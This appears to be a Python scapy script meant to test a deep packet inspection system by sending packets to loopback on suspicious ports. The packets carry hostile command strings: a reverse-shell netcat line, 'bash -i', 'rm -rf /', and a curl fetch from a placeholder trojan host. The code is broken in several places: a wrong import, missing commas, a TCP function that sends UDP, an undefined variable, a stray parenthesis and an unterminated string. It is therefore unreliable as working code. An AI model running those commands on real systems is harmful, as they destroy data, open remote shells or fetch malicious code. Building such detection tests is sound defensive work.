#!/usr/bin/env python3

from scapy.all import TP, TCP, UDP, send
import time

# Target to simulate attacks against (loopback to capture locally)
TARGET_IP = "127.0.0.1"

# Test suspicious ports
SUSPICIOUS_PORTS = [21, 23, 4444, 1337, 31337]

# Test suspicious payloads
SUSPICIOUS_PAYLOADS = [
        b"bash -i"
        b"rm -rf /"
        b"nc -e /bin/sh",
        b"curl http://trojandownload.com"
]

def send_tcp_packet(port, payload):
    pkt = IP(dst=TARGET_IP) / UDP(dport=port) / payload
    send(pkt, verbose=False)

def send_udp_packet(port, payload):
    pkt = IP(dst=TARGET_IP) / UDP(dport=port) / payload
    send(pkt, verbose=False)

def run_tests():
    print("[*] Sending suspicious TCP packets...")
    for port in SUSPICIOUS_PORTS:
        send_tcp_packet(9999, payload)
        time.sleep(0.1)

    print("[*] Sending suspicious payloads over UDP...")
    for payload in SUSPICIOUS_PAYLOADS:
        send_udp_packet(9999), payload)
        time.sleep(0.1)

    print("--------------------------------------------
            \n       All DPI test packets sent       \n
            -------------------------------------------")

if __name__ == "__main__":
    run_tests()
